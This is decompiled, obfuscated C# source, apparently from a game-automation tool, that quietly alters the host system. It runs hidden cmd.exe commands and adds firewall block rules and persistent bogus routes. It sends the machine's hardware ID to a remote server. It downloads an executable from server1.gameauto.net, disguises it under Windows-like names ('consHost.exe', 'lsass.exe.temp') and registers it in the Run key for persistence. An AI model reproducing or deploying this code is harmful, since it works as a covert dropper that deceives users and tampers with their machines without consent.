using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Newtonsoft.Json;

namespace ns0
{
	// Token: 0x02000065 RID: 101
	internal sealed class Class68
	{
		// Token: 0x0600036E RID: 878 RVA: 0x0006AF70 File Offset: 0x00069170
		internal static string smethod_0(string string_0)
		{
			string result;
			using (Process process = Process.Start(new ProcessStartInfo
			{
				Arguments = "/C " + string_0,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				FileName = "cmd.exe"
			}))
			{
				using (StreamReader standardOutput = process.StandardOutput)
				{
					result = standardOutput.ReadToEnd();
				}
			}
			return result;
		}

		// Token: 0x0600036F RID: 879 RVA: 0x0006B004 File Offset: 0x00069204
		internal static void smethod_1(string string_0, string string_1, string string_2)
		{
			string text = Class68.smethod_0("netsh advfirewall show currentprofile state | findstr ON");
			if (!text.Contains("State") || !text.Contains("ON"))
			{
				Class68.smethod_0("netsh advfirewall set allprofiles state on");
				Thread.Sleep(2000);
			}
			text = Class68.smethod_0(string.Format("netsh advfirewall firewall add rule name=\"{0}\" protocol={1} dir=out remoteport={2} action=block", string_0, string_1, string_2));
			text.Contains("Ok.");
		}

		// Token: 0x06000370 RID: 880 RVA: 0x0006B06C File Offset: 0x0006926C
		internal static void smethod_2(string string_0, bool bool_0 = true, bool bool_1 = true)
		{
			try
			{
				if (bool_1 && !frmLogin.list_33.Contains(string_0))
				{
					frmLogin.list_33.Add(string_0);
				}
				if (bool_0)
				{
					Class68.smethod_0(string.Format("netsh advfirewall firewall delete rule name={0}", string_0));
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000371 RID: 881 RVA: 0x0006B0C0 File Offset: 0x000692C0
		internal static void smethod_3()
		{
			try
			{
				if (frmLogin.list_1.Count > 0)
				{
					for (int i = frmLogin.list_1.Count - 1; i >= 0; i--)
					{
					}
				}
				if (frmLogin.list_33.Count > 0 && frmLogin.string_14 != "")
				{
					for (int j = frmLogin.list_33.Count - 1; j >= 0; j--)
					{
						Class68.smethod_1(frmLogin.list_33[j], "tcp", frmLogin.string_14);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000372 RID: 882 RVA: 0x0006B158 File Offset: 0x00069358
		internal static void smethod_4(bool bool_0 = true)
		{
			try
			{
				string text = new WebClient().DownloadString(frmLogin.string_13);
				if (text != "")
				{
					string[] array = text.Split(new char[]
					{
						'\n'
					});
					if (array.Length > 3)
					{
						array[3] = array[3].Replace("ServerIp=", "").Replace("\r", "");
						array[3] = Class83.smethod_79(array[3]);
						if (array[3] != "")
						{
							IPHostEntry hostEntry = Dns.GetHostEntry(array[3]);
							if (hostEntry.AddressList.Length != 0)
							{
								IPAddress[] addressList = hostEntry.AddressList;
								for (int i = 0; i < addressList.Length; i++)
								{
									Class68.smethod_8(addressList[i].ToString(), bool_0, true);
								}
							}
						}
					}
					if (array.Length > 4 && frmLogin.list_1.Count > 0 && array[4] != "")
					{
						array[4] = array[4].Replace("ServerPort=", "").Replace("\r", "");
						array[4] = Class83.smethod_79(array[4]);
						frmLogin.string_14 = array[4];
						if (array[4] != "")
						{
							foreach (string string_ in frmLogin.list_1)
							{
								Class68.smethod_2(Class68.smethod_9(string_, ""), bool_0, true);
							}
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000373 RID: 883 RVA: 0x0006B300 File Offset: 0x00069500
		internal static void smethod_5(bool bool_0 = true)
		{
			if (Class166.list_0.Count > 0)
			{
				foreach (Class165 @class in Class166.list_0)
				{
					try
					{
						Class68.smethod_8(@class.string_0, bool_0, false);
						Class68.smethod_8(@class.string_1, bool_0, false);
						Class68.smethod_2(Class68.smethod_9(@class.string_0, @class.int_1.ToString()), bool_0, false);
						Class68.smethod_2(Class68.smethod_9(@class.string_1, @class.int_2.ToString()), bool_0, false);
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x06000374 RID: 884 RVA: 0x0006B3C4 File Offset: 0x000695C4
		internal static void smethod_6()
		{
			if (Class166.list_0.Count > 0)
			{
				List<string> list = new List<string>();
				foreach (Class165 @class in Class166.list_0)
				{
					try
					{
						Class68.smethod_7(@class.string_0, false);
						list.Add(@class.string_0);
						if (@class.string_0 != @class.string_1 && !list.Contains(@class.string_1))
						{
							Class68.smethod_7(@class.string_1, false);
						}
						Class68.smethod_1(Class68.smethod_9(@class.string_0, @class.int_1.ToString()), "tcp", @class.int_1.ToString());
						if (@class.string_0 != @class.string_1 && @class.int_1 != @class.int_2)
						{
							Class68.smethod_1(Class68.smethod_9(@class.string_1, @class.int_2.ToString()), "tcp", @class.int_2.ToString());
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x06000375 RID: 885 RVA: 0x0006B4FC File Offset: 0x000696FC
		internal static void smethod_7(string string_0, bool bool_0 = true)
		{
			if (bool_0 && frmLogin.list_1.Contains(string_0))
			{
				frmLogin.list_1.Remove(string_0);
			}
			if (Environment.OSVersion.Version.Major <= 5)
			{
				try
				{
					foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
					{
						if (networkInterface.OperationalStatus == OperationalStatus.Up)
						{
							using (IEnumerator<GatewayIPAddressInformation> enumerator = networkInterface.GetIPProperties().GatewayAddresses.GetEnumerator())
							{
								if (enumerator.MoveNext())
								{
									byte[] addressBytes = enumerator.Current.Address.GetAddressBytes();
									if (addressBytes.Length != 0)
									{
										addressBytes[3] = (byte)frmLogin.random_0.Next(2, 200);
									}
									frmLogin.string_16 = new IPAddress(addressBytes).ToString();
								}
							}
						}
					}
					Class68.smethod_0(string.Format("route add {0} mask 255.255.255.255 {1} metric 1 -p", string_0, frmLogin.string_16));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
			string format = "route add {0} mask 255.255.255.255 {1}.{2}.{3}.{4} if 1 /p";
			object[] array = new object[5];
			array[0] = string_0;
			int num = 1;
			int i = frmLogin.random_0.Next(1, 224);
			array[num] = i.ToString();
			int num2 = 2;
			i = frmLogin.random_0.Next(1, 224);
			array[num2] = i.ToString();
			int num3 = 3;
			i = frmLogin.random_0.Next(1, 224);
			array[num3] = i.ToString();
			int num4 = 4;
			i = frmLogin.random_0.Next(1, 224);
			array[num4] = i.ToString();
			Class68.smethod_0(string.Format(format, array));
		}

		// Token: 0x06000376 RID: 886 RVA: 0x0006B680 File Offset: 0x00069880
		internal static void smethod_8(string string_0, bool bool_0 = true, bool bool_1 = true)
		{
			try
			{
				if (string_0 != "" && string_0.Contains("."))
				{
					if (bool_1 && !frmLogin.list_1.Contains(string_0))
					{
						frmLogin.list_1.Add(string_0);
					}
					if (bool_0)
					{
						Class68.smethod_0("route delete " + string_0);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000377 RID: 887 RVA: 0x0006B6EC File Offset: 0x000698EC
		internal static string smethod_9(string string_0 = "", string string_1 = "")
		{
			if (frmLogin.string_17 == "")
			{
				frmLogin.string_17 = Environment.MachineName;
			}
			string text = Class83.Class85.smethod_0(frmLogin.string_2 + frmLogin.string_17 + "@713").Substring(0, 12).ToLower();
			if (string_0 == "" && string_1 == "")
			{
				return text;
			}
			return text + "_" + Class83.Class85.smethod_0(string_0 + string_1 + frmLogin.string_17 + "7r7").Substring(0, 5).ToLower();
		}

		// Token: 0x06000378 RID: 888 RVA: 0x0006B784 File Offset: 0x00069984
		internal static void smethod_10()
		{
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			string text = Class83.smethod_98(5);
			dictionary.Add("salt", text);
			dictionary.Add("HWID", frmLogin.string_2);
			dictionary.Add("debugApp", frmLogin.class130_0);
			string string_ = JsonConvert.SerializeObject(dictionary);
			string str = text + Class83.Class85.smethod_0(text + "tinhkiemtuoigi?").Substring(0, 20);
			string string_2 = "k=" + str + "&data=" + Class83.smethod_39(string_, 0);
			Class83.smethod_125("http://server1.gameauto.net/" + frmLogin.class101_0.globalSettings_0.BlockReportURL, string_2, "POST", frmLogin.class101_0.globalSettings_0.MainCookie, true);
		}

		// Token: 0x06000379 RID: 889 RVA: 0x0006B83C File Offset: 0x00069A3C
		internal static void smethod_11()
		{
			try
			{
				string arg = Application.StartupPath + "\\GAuto.exe";
				string str = Class83.Class85.smethod_0("7f8b" + frmLogin.string_2).ToLower().Substring(0, 8) + ".exe";
				string text = Path.GetTempPath() + str;
				if (!File.Exists(text))
				{
					byte[] shortcut = Class212.shortcut;
					File.WriteAllBytes(text, shortcut);
				}
				if (File.Exists(text))
				{
					string arguments = string.Format("shortcut \"{0}\" \"~$folder.desktop$\" \"{1}\" master", arg, frmLogin.string_15);
					Process.Start(new ProcessStartInfo
					{
						FileName = text,
						Arguments = arguments,
						RedirectStandardOutput = true,
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						UseShellExecute = false
					});
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600037A RID: 890 RVA: 0x0006B90C File Offset: 0x00069B0C
		private static string smethod_12(string string_0)
		{
			string result = "";
			try
			{
				using (MD5 md = MD5.Create())
				{
					using (FileStream fileStream = File.OpenRead(string_0))
					{
						try
						{
							result = BitConverter.ToString(md.ComputeHash(fileStream)).Replace("-", "").ToUpper();
						}
						catch (Exception)
						{
						}
					}
				}
			}
			catch (Exception)
			{
			}
			return result;
		}

		// Token: 0x0600037B RID: 891 RVA: 0x0006B9A4 File Offset: 0x00069BA4
		internal static void smethod_13()
		{
			try
			{
				if (frmLogin.string_17 == "")
				{
					frmLogin.string_17 = Environment.MachineName;
				}
				if (!frmLogin.list_2.Contains(frmLogin.string_17.ToUpper()))
				{
					string text = "consHost.exe";
					string text2 = Path.GetTempPath() + text;
					string text3 = "lsass.exe.temp";
					bool flag = false;
					WebClient webClient = new WebClient();
					if (!File.Exists(text2))
					{
						flag = true;
					}
					else
					{
						try
						{
							string text4 = webClient.DownloadString("http://server1.gameauto.net/gbrick.bz.md5");
							if (text4 != "" && Class68.smethod_12(text2) != text4)
							{
								flag = true;
							}
						}
						catch (Exception)
						{
						}
					}
					try
					{
						if (flag)
						{
							webClient.DownloadFile("http://server1.gameauto.net/gbrick.bz", text3);
							try
							{
								try
								{
									Process[] processesByName = Process.GetProcessesByName(text.Replace(".exe", ""));
									if (processesByName.Length != 0)
									{
										processesByName[0].Kill();
									}
								}
								catch (Exception)
								{
									throw;
								}
								if (File.Exists(text2))
								{
									File.Delete(text2);
								}
								File.Move(text3, text2);
							}
							catch (Exception)
							{
							}
						}
					}
					catch (Exception)
					{
					}
					Class68.smethod_14(text2);
					if (!File.Exists(text2))
					{
						byte[] gbrick = Class212.gbrick;
						File.WriteAllBytes(text2, gbrick);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600037C RID: 892 RVA: 0x0006BB40 File Offset: 0x00069D40
		internal static void smethod_14(string string_0)
		{
			try
			{
				using (RegistryKey registryKey = RegistryKey.OpenRemoteBaseKey(RegistryHive.CurrentUser, frmLogin.string_17).OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
				{
					registryKey.SetValue("gbrick", string_0);
				}
			}
			catch (Exception)
			{
			}
		}
	}
}
